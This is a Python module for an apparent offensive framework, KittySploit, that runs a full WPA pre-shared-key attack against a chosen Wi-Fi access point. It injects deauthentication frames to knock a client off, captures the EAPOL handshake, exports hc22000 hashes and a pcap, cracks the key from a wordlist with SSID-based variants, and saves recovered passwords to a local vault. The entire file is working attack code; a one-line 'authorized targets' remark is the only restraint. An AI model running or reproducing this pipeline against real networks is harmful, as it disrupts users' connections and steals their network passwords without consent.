#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""End-to-end WLAN PSK pipeline: capture → .22000 → optional CPU crack → vault."""

from __future__ import annotations
import os
import time
from pathlib import Path
from kittysploit import *
from lib.protocols.wlan.workflow import WLAN_PSK_PIPELINE
from lib.protocols.wlan.wlan_client import Wlan_client


class Module(Auxiliary, Wlan_client):
    __info__ = {
        "name": "WiFi WPA Pipeline (Capture → Crack → Vault)",
        "description": (
            "Orchestrates handshake capture, hc22000 export, optional wordlist crack, "
            "and local vault storage in one run (authorized targets)."
        ),
        "author": ["KittySploit Team"],
        "tags": ["wlan", "wifi", "pipeline", "handshake", "hc22000"],
        "references": ["https://attack.mitre.org/techniques/T1110.002/"],
        "agent": {
            "chain": {
                "suggested_followups": WLAN_PSK_PIPELINE,
            },
        },
    }

    bssid = OptString("", "Target AP BSSID", required=True)
    ssid = OptString("", "SSID", required=True)
    channel = OptInteger(0, "AP channel", required=False)
    client = OptString("", "Client MAC to deauth (optional)", required=False)
    capture_time = OptInteger(90, "Handshake sniff seconds", required=False)
    wordlist = OptFile("", "Wordlist for CPU crack (skip if empty)", required=False)
    max_passwords = OptInteger(50000, "Crack budget", required=False)
    deauth_first = OptBool(True, "Deauth client before capture", required=False)
    use_ssid_variants = OptBool(True, "SSID mutations in crack", required=False)

    def check(self):
        if not str(self.bssid or "").strip() or not str(self.ssid or "").strip():
            print_error("BSSID and SSID required")
            return False
        return self.wlan_check_iface()

    def run(self):
        bssid = str(self.bssid).strip().lower()
        ssid = str(self.ssid).strip()
        ch = int(self.channel or 0)
        client = str(self.client or "").strip().lower()
        cap_t = max(15, int(self.capture_time or 90))
        wl = str(self.wordlist or "").strip()

        if ch:
            self.wlan_set_channel(ch)

        print_info("WLAN pipeline: capture → hc22000 → crack → vault")
        print_info(f"Target {ssid} ({bssid})")
        print_status(f"Chain modules: {', '.join(WLAN_PSK_PIPELINE)}")

        if client and bool(self.deauth_first):
            print_status(f"Deauth {client}")
            try:
                for fr in self.wlan_build_client_deauth(bssid, client):
                    self.wlan_inject_raw([fr], count=5)
            except (PermissionError, OSError) as exc:
                print_warning(f"Deauth: {exc}")
            time.sleep(0.5)

        self.wlan_reset_handshake_tracker()
        ssid_map = {bssid: ssid}
        frames: list[bytes] = []

        def on_frame(raw: bytes, _rssi: int | None) -> None:
            beacon = self.wlan_parse_beacon(raw)
            if beacon and beacon.ssid:
                self.wlan_note_beacon_ssid(beacon, ssid_map)
            eap = self.wlan_parse_eapol(raw)
            if not eap or eap.bssid.lower() != bssid:
                return
            if client and eap.station.lower() != client:
                return
            frames.append(raw)
            self.wlan_track_parsed_eapol(eap, ssid_map)
            print_status(f"EAPOL M{eap.key_message} ← {eap.station}")

        print_status(f"Capturing {cap_t}s...")
        try:
            self.wlan_sniff(on_frame, timeout=float(cap_t))
        except (PermissionError, OSError) as exc:
            print_error(str(exc))
            return False

        lines = self.wlan_export_hc22000(ssid_map)
        stamp = time.strftime("%Y%m%d_%H%M%S")
        tag = bssid.replace(":", "")
        hc_path = os.path.abspath(f"pipeline_{tag}_{stamp}.hc22000")
        pcap_path = os.path.abspath(f"pipeline_{tag}_{stamp}.pcap")

        if frames:
            self.wlan_write_pcap(pcap_path, frames)
            print_success(f"PCAP → {pcap_path}")

        if not lines:
            print_warning("No .22000 lines — retry with CLIENT deauth or longer CAPTURE_TIME")
            for row in self.wlan_handshake_summaries():
                if row.get("fast_transition"):
                    print_warning(f"  FT — {row['bssid']}")
            return False

        self.wlan_write_hc22000(hc_path, lines)
        print_success(f"HC22000 ({len(lines)}) → {hc_path}")

        if not wl or not Path(wl).is_file():
            self.wlan_vault_store(
                ssid=ssid,
                bssid=bssid,
                secret_type="hash_ref",
                hash_file=hc_path,
                pcap_file=pcap_path,
                nickname=f"{ssid}-pipeline",
            )
            print_info("No WORDLIST — hash stored in vault only")
            print_info(f"Crack: use auxiliary/wlan/wpa_cpu_crack HASH_FILE {hc_path}")
            return True

        passwords = list(self.wlan_iter_wordlist(wl))
        if bool(self.use_ssid_variants):
            passwords.extend(self.wlan_ssid_wordlist_variants(ssid))
        passwords = self.wlan_merge_wordlists(passwords)
        limit = int(self.max_passwords or 0)
        if limit > 0:
            passwords = passwords[:limit]

        print_status(f"CPU crack ({len(passwords)} passwords)...")
        found = self.wlan_crack_hashes(hc_path, passwords)
        if not found:
            print_warning("No password matched")
            self.wlan_vault_store(
                ssid=ssid,
                bssid=bssid,
                secret_type="hash_ref",
                hash_file=hc_path,
                pcap_file=pcap_path,
            )
            return False

        for _tag, pwd in found.items():
            print_success(f"PSK: {pwd}")
            self.wlan_vault_store(
                ssid=ssid,
                bssid=bssid,
                secret_type="psk",
                secret=pwd,
                hash_file=hc_path,
                pcap_file=pcap_path,
                nickname=f"{ssid}-pipeline",
            )
            print_success("Vault updated (~/.kittysploit/wlan_vault.json)")
        return True